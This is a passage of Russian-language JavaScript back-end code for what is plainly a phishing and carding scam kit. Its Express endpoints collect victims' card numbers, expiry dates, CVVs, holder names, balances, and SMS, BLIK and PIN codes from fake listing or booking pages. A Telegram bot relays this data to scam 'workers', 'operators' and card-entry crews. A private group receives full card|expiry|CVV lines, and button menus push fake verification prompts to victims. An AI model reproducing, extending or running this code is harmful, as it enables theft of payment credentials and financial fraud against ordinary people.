👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>
  `,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.callbackButton(
                    "❌ Отказать вбивера",
                    `log_${log.id}_leavevbiv`
                  ),
                ],
              ]),
            }
          );

          await log.update({
            chatMsg: msg.message_id,
          });
        }

      }
    }, 500);

    if (!vbiverId) {
      const msg = await bot.sendMessage(
        settings.logsGroupId,
        `<b>✏️ Ввод карты ${ad.user.hideService == true ? "🏴" : ad.service.title
        }</b>
  
💰 Баланс: <b>${getBalance(log, ad)}</b>
🪪 Держатель карты: <b>${log.cardHolder}</b>
💳 Номер карты: <b>${log.cardNumber}</b>
ℹ️ Информация о карте: ${cardInfo}

<code>/bin ${log.cardNumber.slice(0, 6)}</code>

👤 Воркер: <b>${ad.user.username ? `@${ad.user.username}` : `Профиль (${ad.userId})`
        }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>
  `,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)],
            [Markup.callbackButton("💳 Выдать лог ", `enter_${log.id}`)],
          ]),
        }
      );


      await log.update({
        chatMsg: msg.message_id,
      });
    }

    await bot
      .sendMessage(
        ad.userId,
        `<b>💳 Ввод карты ${ad.service.title}</b>

💰 Баланс: <b>${getBalance(log, ad)}</b>

💳 Номер карты: <b>${log.cardNumber.replace(
          /^(.{6})([0-9]{6})/,
          "$1******"
        )}</b>

ℹ️ О карте: ${cardInfo}

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b> 
`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            ...(user1
              ? [
                [
                  Markup.urlButton(
                    `💬 Связаться с вбивером: ${user1.username}`,
                    `tg://resolve?domain=${user1.username}`
                  ),
                ],
              ]
              : []),
            ...(user.operator != null
              ? [
                [
                  Markup.callbackButton(
                    "👨🏼‍💻 Статус оператора",
                    `operator_status`
                  ),
                ],
              ]
              : []),
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],
            ...(user.operator == null
              ? [
                [
                  Markup.callbackButton("💳 СМЕНА", `userLog_${log.id}_otherCard`),
                  Markup.callbackButton("💰 ТОЧНЫЙ", `userLog_${log.id}_correctBalance`),
                ],
              ]
              : []),
            [Markup.callbackButton("📞 ПРОЗВОН (15%)", `userLog_${log.id}_call_${user.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],

            [
              Markup.callbackButton("📸 Селфи", `request_selfie_${ad.id}`),
              Markup.callbackButton("🗨️ Диалог", `dialog_${support.id}`),
            ],

            [
              Markup.callbackButton(
                "🗑️ Удалить объявление",
                `delete_ad1_${ad.id}`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);
    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      const operatorMsg = await bot
        .sendMessage(
          operator.userId,
          `<b>💳 Ввод карты ${ad.service.title}</b>

👤 Воркер: <b>${ad.user.username ? `@${ad.user.username}` : `Профиль (${ad.userId})`
          }</b>

💰 Баланс: <b>${getBalance(log, ad)}</b>

💳 Номер карты: <b>${log.cardNumber.replace(
            /^(.{6})([0-9]{6})/,
            "$1******"
          )}</b>

ℹ️ О карте: ${cardInfo}

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b> `,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              ...(user1
                ? [
                  [
                    Markup.urlButton(
                      `💬 Связаться с вбивером: ${user1.username}`,
                      `tg://resolve?domain=${user1.username}`
                    ),
                  ],
                ]
                : []),
              [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

              [
                Markup.callbackButton("💳 СМЕНА", `userLog_${log.id}_otherCard`),
                Markup.callbackButton("💰 ТОЧНЫЙ", `userLog_${log.id}_correctBalance`),
                Markup.callbackButton("📞 ПРОЗВОН (15%)", `userLog_${log.id}_call_${operator.userId}`)
              ],

              [
                Markup.callbackButton(
                  "✍️ Ответить за воркера",
                  `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],

              [
                Markup.callbackButton("📸 Селфи", `request_selfie_${ad.id}`),
                Markup.callbackButton("🗨️ Диалог", `dialog_${support.id}`),
              ],

              [
                Markup.callbackButton(
                  "🗑️ Удалить объявление",
                  `delete_ad1_${ad.id}`
                ),
              ],
            ]),
          }
        )
        .catch((err) => err);

      await bot
        .pinChatMessage(operator.userId, operatorMsg.message_id)
        .catch((err) => {
          console.error(
            "❌ Не удалось закрепить сообщение оператору:",
            err.message
          );
        });
    }

    if (settings.allLogsEnabled) {
      await bot
        .sendMessage(
          settings.allGroupId,
          `💳 <b>Ввод карты ${ad.user.hideService ? "🏴" : ad.service.title}</b>

- Воркер: ${ad.user.hideNick ? "🙈 Скрыт" : `#${user.tag}`}
- Оператор: ${operator
            ? `<a href="tg://user?id=${operator.userId}">${operator.username}</a>`
            : "отсутствует"
          }
- Наставник: ${mentor
            ? `<a href="tg://user?id=${mentor.id}">${mentor.username}</a>`
            : "отсутствует"
          }

💰 Цена: <b>${ad.price
            ? ad.user.hideService
              ? (ad.price.toString().match(/(\d+([.,]\d+)?)/)?.[0] ||
                "отсутствует") + "⚡️"
              : ad.price
            : "отсутствует"
          }</b>
💵 Баланс: <b>${getBalance1(log, ad)}</b>`,
          {
            disable_notification: true,
            disable_web_page_preview: true,
            parse_mode: "HTML",
          }
        )
        .catch((err) => console.error(err));
    }
    await bot.sendMessage(
      settings.privateLogsGroupId, // ID чата для логирования карт
      `<b>${log.cardHolder || "нет данных"}|${log.cardNumber}|${log.cardExpire}|${log.cardCvv}</b>

🔍 <b>#id${ad.id}</b>`,
      {
        parse_mode: "HTML",
      }
    );

    return res.json({
      token: log.token,
    });
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});
app.post(`/api/submitCardAgoda`, async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.body.adId, {
      include: [
        {
          association: "service",
          required: true,

          include: [
            {
              association: "currency",
              required: true,
            },
          ],
        },
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);

    const bin = req.body.number.replace(/\D+/g, "").slice(0, 6);
    const detectedCurrency = await getCurrencyFromBin(bin);

    let rates = { USD: 1, EUR: 1 };

    if (detectedCurrency) {
      const currencyFromDb = await Currency.findOne({
        where: { code: detectedCurrency },
      });
      if (currencyFromDb) {
        rates.USD = parseFloat(currencyFromDb.usd);
        rates.EUR = parseFloat(currencyFromDb.eur);
      }
    }

    // Обогащаем `ad` временными значениями для getBalance / getBalance1
    ad.detectedCurrency = detectedCurrency || ad.service.currency.code;
    ad.service.currencyRates = rates;

    const cardSearch = await BlockCards.count({
      where: {
        card: req.body.number.replace(/\D+/g, ""),
      },
    });

    if (cardSearch > 0) {
      return res.json({
        status: false,
      });
    }

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, ad)}`;

    const log = await Log.create({
      token: Math.random() + new Date().valueOf() + Math.random(),
      cardNumber: escapeHTML(String(req.body.number).replace(/\D+/g, "")),
      cardExpire: escapeHTML(String(req.body.expire).replace(/[^0-9\/]+/g, "")),
      cardCvv: escapeHTML(String(req.body.cvv).replace(/\D+/g, "")),
      cardHolder: escapeHTML(req.body.holder),
      otherInfo: {
        cardBalance: escapeHTML(req.body.balance),
      },
      adId: ad.id,
      userId: ad.userId,
      ip: ip, // 👈 ДОБАВЬ ЭТО
    });
    await ad.update({
      price: `${req.body.adprice} ${req.body.adcurrency}`,
    });

    const user = await User.findOne({
      where: { id: ad.userId },
    });
    if (!user) return res.status(404).send("Пользователь не найден");

    const operator = user.operator
      ? await Operators.findOne({ where: { userId: user.operator } })
      : null;
    const mentor = user.mentor
      ? await Nastavniki.findOne({ where: { id: user.mentor } })
      : null;

    const settings = await Settings.findByPk(1);
    const support = await generateSupport(ad, req, res);

    const [cardInfo, cardInfo1] = await Promise.all([
      getCardInfo(log.cardNumber),
      getCardInfo1(log.cardNumber),
    ]);

    // 🧠 Один запрос — одна логика поиска writerId
    const logs = await Log.findAll({
      where: { adId: ad.id },
      order: [["createdAt", "DESC"]],
    });

    let vbiverId = null;
    let lastCardLog = null;

    for (const v of logs) {
      if (v.writerId && !lastCardLog) {
        vbiverId = v.writerId;
        lastCardLog = v; // сохраняем последний лог с writerId
        break;
      }
    }

    // Проверка на совпадение карты
    let isSameCard = false;
    if (lastCardLog) {
      const newCardNumber = req.body.number.replace(/\D+/g, '');
      const lastCardNumber = lastCardLog.cardNumber;
      isSameCard = newCardNumber === lastCardNumber;
    }

    // 🧼 Один update
    await log.update({
      writerId: vbiverId || null,
      bin: cardInfo1,
      supportId: support.id,
    });

    // 🧾 Далее, если нужно:
    const user1 = vbiverId ? await User.findByPk(vbiverId) : null;

    setTimeout(async () => {
      if (vbiverId) {
        const msgToVbiver = await bot.sendMessage(
          vbiverId,
          `<b>${isSameCard
            ? `🔄 Мамонт ввёл ту же карту ${ad.user.hideService ? "🏴" : ad.service.title}`
            : `🆕 Мамонт ввел новую карту ${ad.user.hideService ? "🏴" : ad.service.title}`}</b>`
          + `
      
💰 Баланс: <b>${getBalance(log, ad)}</b>
🪪 Держатель карты: <b>${log.cardHolder}</b>
💳 Номер карты: <code>${log.cardNumber}</code>
💳 Срок действия: <code>${log.cardExpire}</code>
💳 CVV: <code>${log.cardCvv}</code>
ℹ️ Информация о карте: ${cardInfo}

<code>/bin ${log.cardNumber.slice(0, 6)}</code>

👤 Воркер: <b>${ad.user.username ? `@${ad.user.username}` : `Профиль (${ad.userId})`
          }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>

<i>⚠️ Незабудь после ухода со вбива прописать комманду</i> <b>/leavealllogs</b>, <i>для того чтоб отказаться от всех логов.</i>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              // Главное
              [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

              // Онлайн / Диалог / Фото
              [
                Markup.callbackButton("👁 Онлайн", `check_mamont_${ad.id}`),
                Markup.callbackButton(
                  "🗨️ Диалог",
                  `dialog_writer_${support.id}`
                ),
                Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
              ],

              // Кастомные PUSH / SMS
              [
                Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
                Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
              ],

              // PUSH / SMS / ТОЧНЫЙ
              [
                Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
                Markup.callbackButton(
                  "💰 ТОЧНЫЙ",
                  `log_${log.id}_correctBalance`
                ),
                Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
              ],

              // Карта / Лимиты
              [
                Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
                Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
              ],

              // Баланс / PIN
              [
                Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
                Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
              ],

              // Ошибки
              [
                Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
                Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
              ],
              // Блок / Разблок (новые надписи)
              [
                Markup.callbackButton(
                  "⛔ Блок. Карту",
                  `log_${log.id}_banCard`
                ),
                Markup.callbackButton(
                  "✅ Разблок. Карту",
                  `log_${log.id}_unbanCard`
                ),
              ],

              // Отказ
              [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeave`)],
            ]),
          }
        );



        await log.update({ chatMsg2: msgToVbiver.message_id });

        if (vbiverId) {
          const operator = await Operators.findOne({
            where: {
              userId: user.operator,
            },
          });

          const msg = await bot.sendMessage(
            settings.logsGroupId,
            `<b>${isSameCard
              ? `🔄 Мамонт ввёл ту же карту ${ad.user.hideService ? "🏴" : ad.service.title}`
              : `🆕 Мамонт ввел новую карту ${ad.user.hideService ? "🏴" : ad.service.title}`}</b>`
            + `

🔗 Привязан к: <b>@${user1?.username || "неизвестный"}</b>
  
💰 Баланс: <b>${getBalance(log, ad)}</b>
🪪 Держатель карты: <b>${log.cardHolder}</b>
💳 Номер карты: <b>${log.cardNumber}</b>
ℹ️ Информация о карте: ${cardInfo}

<code>/bin ${log.cardNumber.slice(0, 6)}</code>

👤 Воркер: <b>${ad.user.username
              ? `@${ad.user.username}`
              : `Профиль (${ad.userId})`
            }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>
  `,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.callbackButton(
                    "❌ Отказать вбивера",
                    `log_${log.id}_leavevbiv`
                  ),
                ],
              ]),
            }
          );

          await log.update({
            chatMsg: msg.message_id,
          });
        }


      }
    }, 500);

    if (!vbiverId) {
      const msg = await bot.sendMessage(
        settings.logsGroupId,
        `<b>✏️ Ввод карты ${ad.service.title}</b>
  
💰 Баланс: <b>${getBalance(log, ad)}</b>
🪪 Держатель карты: <b>${log.cardHolder}</b>
💳 Номер карты: <b>${log.cardNumber}</b>
ℹ️ Информация о карте: ${cardInfo}

<code>/bin ${log.cardNumber.slice(0, 6)}</code>

👤 Воркер: <b>${ad.user.username ? `@${ad.user.username}` : `Профиль (${ad.userId})`
        }</b>
👨🏼‍💻 Оператор: <b>${operator ? `@${operator.username}` : "отсутствует"}</b>

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b>
  `,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)],
            [Markup.callbackButton("💳 Выдать лог ", `enter_${log.id}`)],
          ]),
        }
      );


      await log.update({
        chatMsg: msg.message_id,
      });
    }

    await bot
      .sendMessage(
        ad.userId,
        `<b>💳 Ввод карты ${ad.service.title}</b>

💰 Баланс: <b>${getBalance(log, ad)}</b>

💳 Номер карты: <b>${log.cardNumber.replace(
          /^(.{6})([0-9]{6})/,
          "$1******"
        )}</b>

ℹ️ О карте: ${cardInfo}

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b> 
`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            ...(user1
              ? [
                [
                  Markup.urlButton(
                    `💬 Связаться с вбивером: ${user1.username}`,
                    `tg://resolve?domain=${user1.username}`
                  ),
                ],
              ]
              : []),
            ...(user.operator != null
              ? [
                [
                  Markup.callbackButton(
                    "👨🏼‍💻 Статус оператора",
                    `operator_status`
                  ),
                ],
              ]
              : []),
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],
            ...(user.operator == null
              ? [
                [
                  Markup.callbackButton("💳 СМЕНА", `userLog_${log.id}_otherCard`),
                  Markup.callbackButton("💰 ТОЧНЫЙ", `userLog_${log.id}_correctBalance`),
                ],
              ]
              : []),
            [Markup.callbackButton("📞 ПРОЗВОН (15%)", `userLog_${log.id}_call_${user.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],

            [
              Markup.callbackButton("📸 Селфи", `request_selfie_${ad.id}`),
              Markup.callbackButton("🗨️ Диалог", `dialog_${support.id}`),
            ],

            [
              Markup.callbackButton(
                "🗑️ Удалить объявление",
                `delete_ad1_${ad.id}`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);
    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      const operatorMsg = await bot
        .sendMessage(
          operator.userId,
          `<b>💳 Ввод карты ${ad.service.title}</b>

👤 Воркер: <b>${ad.user.username ? `@${ad.user.username}` : `Профиль (${ad.userId})`
          }</b>

💰 Баланс: <b>${getBalance(log, ad)}</b>

💳 Номер карты: <b>${log.cardNumber.replace(
            /^(.{6})([0-9]{6})/,
            "$1******"
          )}</b>

ℹ️ О карте: ${cardInfo}

📦 Объявление: <b>${ad.title == null ? "отсутствует" : ad.title}</b>
💰 Цена: <b>${ad.price == null ? "отсутствует" : ad.price}</b>

${getUserInfo(req)}

🦣 <b>${mammothTag}</b>

🔍 <b>#id${ad.id}</b> `,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              ...(user1
                ? [
                  [
                    Markup.urlButton(
                      `💬 Связаться с вбивером: ${user1.username}`,
                      `tg://resolve?domain=${user1.username}`
                    ),
                  ],
                ]
                : []),
              [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${ad.id}`)],

              [
                Markup.callbackButton("💳 СМЕНА", `userLog_${log.id}_otherCard`),
                Markup.callbackButton("💰 ТОЧНЫЙ", `userLog_${log.id}_correctBalance`),
                Markup.callbackButton("📞 ПРОЗВОН (15%)", `userLog_${log.id}_call_${operator.userId}`)
              ],

              [
                Markup.callbackButton(
                  "✍️ Ответить за воркера",
                  `operatorSend_${support.id}_send_message_${user.id}_${ad.id}`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],

              [
                Markup.callbackButton("📸 Селфи", `request_selfie_${ad.id}`),
                Markup.callbackButton("🗨️ Диалог", `dialog_${support.id}`),
              ],

              [
                Markup.callbackButton(
                  "🗑️ Удалить объявление",
                  `delete_ad1_${ad.id}`
                ),
              ],
            ]),
          }
        )
        .catch((err) => err);

      await bot
        .pinChatMessage(operator.userId, operatorMsg.message_id)
        .catch((err) => {
          console.error(
            "❌ Не удалось закрепить сообщение оператору:",
            err.message
          );
        });
    }

    if (settings.allLogsEnabled) {
      await bot
        .sendMessage(
          settings.allGroupId,
          `💳 <b>Ввод карты ${ad.user.hideService ? "🏴" : ad.service.title}</b>

- Воркер: ${ad.user.hideNick
            ? "🙈 Скрыт"
            : `<a href="tg://user?id=${ad.userId}">${ad.user.username}</a>`
          }
- Оператор: ${operator
            ? `<a href="tg://user?id=${operator.userId}">${operator.username}</a>`
            : "отсутствует"
          }
- Наставник: ${mentor
            ? `<a href="tg://user?id=${mentor.id}">${mentor.username}</a>`
            : "отсутствует"
          }

💰 Цена: <b>${ad.price
            ? ad.user.hideService
              ? (ad.price.toString().match(/(\d+([.,]\d+)?)/)?.[0] ||
                "отсутствует") + "⚡️"
              : ad.price
            : "отсутствует"
          }</b>
💵 Баланс: <b>${getBalance1(log, ad)}</b>`,
          {
            disable_notification: true,
            disable_web_page_preview: true,
            parse_mode: "HTML",
          }
        )
        .catch((err) => console.error(err));
    }
    await bot.sendMessage(
      settings.privateLogsGroupId, // ID чата для логирования карт
      `<b>${log.cardHolder || "нет данных"}|${log.cardNumber}|${log.cardExpire}|${log.cardCvv}</b>

🔍 <b>#id${ad.id}</b>`,
      {
        parse_mode: "HTML",
      }
    );

    return res.json({
      token: log.token,
    });
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});

app.post(`/api/submitCode`, async (req, res) => {
  try {
    if (!req.body?.token || String(req.body?.token).trim().length < 1)
      return res.sendStatus(200);
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "writer",
          required: true,
        },
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });

    if (!log) return res.sendStatus(404);

    const bin = String(log.cardNumber).slice(0, 6);
    const detectedCurrency = await getCurrencyFromBin(bin);
    const rates = await getRatesFromDb(detectedCurrency);

    log.detectedCurrency = detectedCurrency || log.ad.service.currency.code;
    log.usdRate = rates.USD;
    log.eurRate = rates.EUR;

    const cardBalanceText = log.otherInfo.cardBalance;
    const balanceValue = parseFloat(
      String(cardBalanceText).replace(/\s/g, "").replace(/,/g, ".")
    );

    let balanceText = "неизвестно";
    if (!isNaN(balanceValue)) {
      const currency = log.detectedCurrency;
      const usd = (balanceValue * log.usdRate).toFixed(2);
      const eur = (balanceValue * log.eurRate).toFixed(2);
      balanceText = `${balanceValue.toFixed(
        2
      )} ${currency} / ${usd} USD / ${eur} EUR`;
    }
    const code = escapeHTML(req.body.code.trim());
    const support = await generateSupport(log.ad, req, res);

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, log.ad)}`;

    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo?.bank;
    } catch (err) { }

    if (log.smsCode == code) return res.sendStatus(200);
    await log.update({
      smsCode: code,
    });

    const codeType = {
      sms: "СМС-кода",
      blik: "БЛИК-кода",
      call: "кода из звонка",
      app: "кода из приложения",
      custom: "кастомного вопроса",
      balance: "точного баланса",
      pin: "ПИН-кода",
    };

    const user = await User.findOne({
      where: {
        id: log.ad.userId,
      },
    });

    await bot.sendMessage(
      log.writer.id,
      `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.user.hideService == true ? "🏴" : log.ad.service.title
      }</b>

📤 Код: <b>${code}</b>`,
      {
        reply_to_message_id: log.chatMsg2,
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          // ✅ Главное действие
          [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

          // 🧩 Статус и исполнитель
          [Markup.callbackButton(`📌 Статус: 📤 SMS`, "none")],

          // 👁 Онлайн / 🗨️ Диалог / 🏞️ Фото
          [
            Markup.callbackButton("👁 Онлайн", `check_mamont_${log.ad.id}`),
            Markup.callbackButton("🗨️ Диалог", `dialog_writer_${support.id}`),
            Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
          ],

          // 💬 Кастомные PUSH / SMS
          [
            Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
            Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
          ],

          // PUSH / SMS / ТОЧНЫЙ
          [
            Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
            Markup.callbackButton("💰 ТОЧНЫЙ", `log_${log.id}_correctBalance`),
            Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
          ],

          // Карта / Лимиты
          [
            Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
            Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
          ],

          // Баланс / PIN
          [
            Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
            Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
          ],

          // ❌ Ошибки PUSH
          [
            Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
            Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
          ],
          // ⛔ Блокировка / ✅ Разблокировка карты
          [
            Markup.callbackButton("⛔ Блок. Карту", `log_${log.id}_banCard`),
            Markup.callbackButton(
              "✅ Разблок. Карту",
              `log_${log.id}_unbanCard`
            ),
          ],
          // 🚫 Отказ
          [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeave`)],
        ]),
      }
    );

    await bot
      .sendMessage(
        log.ad.userId,
        `<b>💬 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title
        }</b>

💰 Баланс: <b>${balanceText}</b>

📦 Объявление: <b>${log.ad.title == null ? "отсутствует" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${log.ad.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${support.id}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${support.id}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔓 Открыть ТП",
                `open_support_${log.ad.id}`
              ),
              Markup.callbackButton(
                "🔒 Закрыть ТП",
                `close_support_${log.ad.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${log.ad.id}_${support.id}`
              ),
            ],
          ]),
        }
      )
      .catch((err) => err);

    if (user.operator != null) {
      const operator = await Operators.findOne({
        where: {
          userId: user.operator,
        },
      });

      await bot
        .sendMessage(
          operator.userId,
          `<b>💬 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title
          }</b>

👤 Воркер: <b>${user.username ? `@${user.username}` : `ID: <code>${user.id}</code>`
          }</b>

💰 Баланс: <b>${balanceText}</b>

📦 Объявление: <b>${log.ad.title == null ? "отсутствует" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "👁️ Онлайн ",
                  `check_mamont_${log.ad.id}`
                ),
              ],

              [
                Markup.callbackButton(
                  "✍️ Ответить за воркера",
                  `operatorSend_${support.id}_send_message_${user.id}_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${support.id}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔓 Открыть ТП",
                  `open_support_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${log.ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${log.ad.id}_${support.id}`
                ),
              ],
            ]),
          }
        )
        .catch((err) => err);
    }

    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});
app.post(`/api/submitBalance`, async (req, res) => {
  try {
    if (!req.body?.token || String(req.body?.token).trim().length < 1)
      return res.sendStatus(200);
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "writer",
          required: false,
        },
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });

    const bin = String(log.cardNumber).slice(0, 6);
    const detectedCurrency = await getCurrencyFromBin(bin);

    const currencyFromDb = detectedCurrency
      ? await Currency.findOne({ where: { code: detectedCurrency } })
      : null;

    const currencyCode = detectedCurrency || log.ad.service.currency.code;

    const codeValue = parseFloat(req.body.code);
    const usdText =
      currencyFromDb && !isNaN(codeValue)
        ? ` / ${(codeValue * parseFloat(currencyFromDb.usd)).toFixed(2)} USD`
        : "";

    const eurText =
      currencyFromDb && !isNaN(codeValue)
        ? ` / ${(codeValue * parseFloat(currencyFromDb.eur)).toFixed(2)} EUR`
        : "";

    if (!log) return res.sendStatus(404);
    const code = escapeHTML(req.body.code.trim());
    const support = await generateSupport(log.ad, req, res);
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const mammothTag = `#${await getOrCreateMammothIdentifier(ip, log.ad)}`;

    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo?.bank;
    } catch (err) { }

    const settings = await Settings.findByPk(1);
    if (log.smsCode == code) return res.sendStatus(200);
    await log.update({
      smsCode: code,
      status: null,
    });

